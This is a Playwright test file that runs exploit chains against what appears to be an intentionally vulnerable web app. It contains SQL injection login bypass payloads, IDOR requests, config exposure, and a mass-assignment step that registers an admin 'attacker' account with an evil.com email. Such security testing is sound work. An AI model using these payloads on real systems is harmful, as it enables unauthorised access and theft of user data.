import { Page } from "playwright-core";
import { test, expect } from '@playwright/test';
//RUN_VULN_TESTS=1 npx playwright test test/e2e/vulnerabilities.spec.ts
test.describe('Full Exploit Chain Tests', () => {
  test.beforeEach(async ({ page }: { page: Page }) => {
    await page.goto('/');
  });

  test('should chain SQL injection to admin access', async ({ page }) => {
    // Step 1: SQL injection to get admin token
    await page.fill('#username', "admin' OR '1'='1'--");
    await page.fill('#password', 'anything');
    await page.click('#loginForm button[type="submit"]');
    
    await page.waitForSelector('#loginResult.show', { timeout: 5000 });
    
    // Step 2: Use token for admin access
    await page.click('#adminForm button[type="submit"]');
    await page.waitForSelector('#adminResult.show', { timeout: 5000 });
    
    console.log('✓ Full chain: SQL injection → Admin access');
  });

  test('should exploit multiple vulnerabilities in sequence', async ({ page }) => {
    // 1. SQL Injection
    await page.fill('#username', "admin'--");
    await page.fill('#password', 'hramos');
    await page.click('#loginForm button[type="submit"]');
    await page.waitForSelector('#loginResult.show');
    console.log('  → SQL injection completed');
    
    // 2. IDOR
    await page.fill('#userId', '2');
    await page.click('#idorForm button[type="submit"]');
    await page.waitForSelector('#idorResult.show');
    console.log('  → IDOR exploitation completed');
    
    // 3. Sensitive Data Exposure
    await page.click('#configBtn');
    await page.waitForSelector('#configResult.show');
    console.log('  → Config data exposed');
    
    console.log('✓ Multiple vulnerabilities exploited in sequence');
  });

  test('should demonstrate full penetration testing workflow', async ({ page }) => {
    console.log('Starting penetration test workflow:');
    
    // Reconnaissance: Expose config
    await page.click('#configBtn');
    await page.waitForSelector('#configResult.show');
    console.log('  1. Reconnaissance - Config exposed');
    
    // Exploitation: SQL injection
    await page.fill('#username', "admin' OR '1'='1'--");
    await page.fill('#password', 'test');
    await page.click('#loginForm button[type="submit"]');
    await page.waitForSelector('#loginResult.show');
    console.log('  2. Exploitation - SQL injection successful');
    
    // Privilege escalation: Mass assignment
    const username = `attacker_${Date.now()}`;
    await page.fill('#regUsername', username);
    await page.fill('#regPassword', 'hacked');
    await page.fill('#regEmail', `${username}@evil.com`);
    await page.fill('#regRole', 'admin');
    await page.click('#registerForm button[type="submit"]');
    await page.waitForSelector('#registerResult.show');
    console.log('  3. Privilege escalation - Admin account created');
    
    // Data exfiltration: IDOR
    await page.fill('#userId', '1');
    await page.click('#idorForm button[type="submit"]');
    await page.waitForSelector('#idorResult.show');
    console.log('  4. Data exfiltration - User data stolen');
    
    console.log('✓ Full penetration testing workflow completed');
  });
});
